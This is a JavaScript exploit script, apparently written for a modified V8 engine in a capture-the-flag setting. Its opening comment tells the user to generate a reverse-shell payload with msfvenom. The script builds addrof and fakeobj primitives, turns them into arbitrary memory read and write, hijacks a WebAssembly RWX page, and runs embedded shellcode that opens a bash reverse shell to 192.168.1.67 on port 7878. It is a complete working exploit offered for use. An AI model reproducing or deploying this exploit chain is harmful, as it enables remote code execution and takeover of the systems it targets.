//change your shell code in line 95
//To create your shell code --> $ msfvenom -p linux/x64/exec -f num CMD='bash -c "bash -i >& /dev/tcp/ip/port 0>&1"'

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val, size) {
  f64_buf[0] = val;
  if (size == 32) {
    return BigInt(u64_buf[0]);
  } else if (size == 64) {
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
  }
}


function itof(val, size) {
  if (size == 32) {
    u64_buf[0] = Number(val & 0xffffffffn);
  } else if (size == 64) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
  }
  return f64_buf[0];
}


var float_arr = [1.1, 1.2, 1.3, 1.4];
var float_arr_map = float_arr.GetLastElement();
obj1 = { A: 1.1 };
obj2 = { A: 2.2 };
obj_arr = [obj1, obj2];
obj_arr.length = 1;
obj_arr_map = obj_arr.GetLastElement();


function addrof(in_obj) {
  obj_arr[0] = in_obj;
  obj_arr.SetLastElement(float_arr_map);
  let addr = obj_arr[0];
  obj_arr.SetLastElement(obj_arr_map);
  return ftoi(addr, 32);
}


function fakeobj(addr) {
  float_arr[0] = itof(addr, 32);
  float_arr.SetLastElement(obj_arr_map);
  let fake = float_arr[0];
  float_arr.SetLastElement(float_arr_map);
  return fake;
}


var rw_helper = [float_arr_map, 1.1, 2.2, 3.3];
var rw_helper_addr = addrof(rw_helper) & 0xffffffffn;


function arb_read(addr) {
  let fake = fakeobj(rw_helper_addr - 0x20n);
  rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
  return ftoi(fake[0], 64);
}


function arb_write(addr, value) {
let fake = fakeobj(rw_helper_addr - 0x20n);
  rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
  fake[0] = itof(value, 64);
}


var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,
  130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,
  128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,
  128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,
  0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);

var wasm_module = new WebAssembly.Module(wasmCode);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var exploit = wasm_instance.exports.main;
var wasm_instance_addr = addrof(wasm_instance) & 0xffffffffn;
var rwx = arb_read(wasm_instance_addr + 0x68n);


var arr_buf = new ArrayBuffer(0x300);
var dataview = new DataView(arr_buf);
var arr_buf_addr = addrof(arr_buf) & 0xffffffffn;


arb_write(arr_buf_addr + 0x14n, rwx);


var shellcode = new Uint8Array([0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53,
0x48, 0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8, 0x35, 0x00,
0x00, 0x00, 0x62, 0x61, 0x73, 0x68, 0x20, 0x2d, 0x63, 0x20, 0x22, 0x62, 0x61, 0x73, 0x68,
0x20, 0x2d, 0x69, 0x20, 0x3e, 0x26, 0x20, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x74, 0x63, 0x70,
0x2f, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x2e, 0x36, 0x37, 0x2f, 0x37,
0x38, 0x37, 0x38, 0x20, 0x30, 0x3e, 0x26, 0x31, 0x22, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6,
0x0f, 0x05]);


for (let i = 0; i < shellcode.length; i++) {
  dataview.setUint8(i, shellcode[i], true);
}


exploit();
